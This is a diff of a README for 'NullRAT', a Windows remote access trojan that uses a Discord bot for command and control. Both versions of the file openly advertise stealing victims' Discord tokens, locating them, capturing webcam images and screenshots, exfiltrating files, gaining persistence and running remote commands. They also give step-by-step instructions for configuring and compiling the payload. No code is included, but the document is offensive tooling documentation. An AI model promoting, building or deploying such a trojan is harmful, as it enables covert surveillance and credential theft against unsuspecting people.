@@ -1,38 +1,39 @@
-# NullRAT
-Remote Access Trojan that uses Discord as C&C
-
-It is under 8mb, so you can upload the payloads without nitro
-
-As such, only the useful RAT Features are present inside this program
+<h1 align=center> ☠️ NullRAT</h1>
+<p align=center>Windows-Only Remote Access Trojan that uses Discord as C&C</p>
 
 ## Features:
-- Find the public IP of the victim
-- Find their Discord token(s)
-- Find victim's approximate location
-- Add payload to startup with one command
-- Take pictures using victim's webcam 
-- Take screenshot of victim's PC
-- Download files from victim's PC
-- Upload files to victim's PC
-- Get victim's system information
-- Execute command prompt commands (Thank you Sp00p)
-- Find any environment variables, and chdir there
-- See all the files inside a specified directory
-- Any other commands you (the based people) want
-
-`It's windows-only by the way; sorry :(`
+```
+1) Relatively small size for a Python RAT
+2) Find the public IP of the victim
+3) Find their Discord token(s)
+4) Find victim's approximate location
+5) Add payload to startup with one command
+6) Take pictures using victim's webcam 
+7) Take screenshot of victim's PC
+8) Download files from victim's PC
+9) Upload files to victim's PC
+10) Get victim's system information
+11) Execute command prompt commands (Thank you Sp00p)
+12) Find any environment variables, and chdir there
+13) See all the files inside a specified directory
+```
 
 ## How to use:
-- Python 3.6+ should be installed on the PC and added to path (pip folder should be added too)
-- Don't compile normally using pyinstaller, use the compiler provided
-1) [Create a Discord bot and obtain it's token](https://www.freecodecamp.org/news/create-a-discord-bot-with-python/)
-2) Clone / Download this repository as zip [recommended] / Dowload the release
-3) Execute "Install Dependencies.bat"
-4) Fill up the empty variables & bot token in RAT.py
-5) Execute "RATCompiler.bat"
-6) That should be everything 
+<h4>IMPORTANT:</h4>
+Python 3.6+ should be installed on the PC and added to path (pip folder should be added too)
+
+Also don't compile normally using pyinstaller, use the compiler provided
+
+- [Create a Discord bot and obtain it's token](https://www.freecodecamp.org/news/create-a-discord-bot-with-python/)
+- Git clone / Download repo as zip / Dowload the release
+- Fill up the empty variables & bot token in RAT.py
+- Finally, execute the following: 
+```cmd
+Install Dependencies.bat
+RATCompiler.bat
+```
 
 ## Credits
-- Monst3red for inspiration
-- Sp00p64 for some commands from [his RAT](https://github.com/Sp00p64/DiscordRAT)
-- Buntii for ideas
+1) Monst3red for inspiration
+2) Sp00p64 for some commands from [his RAT](https://github.com/Sp00p64/DiscordRAT)
+3) Buntii for ideas
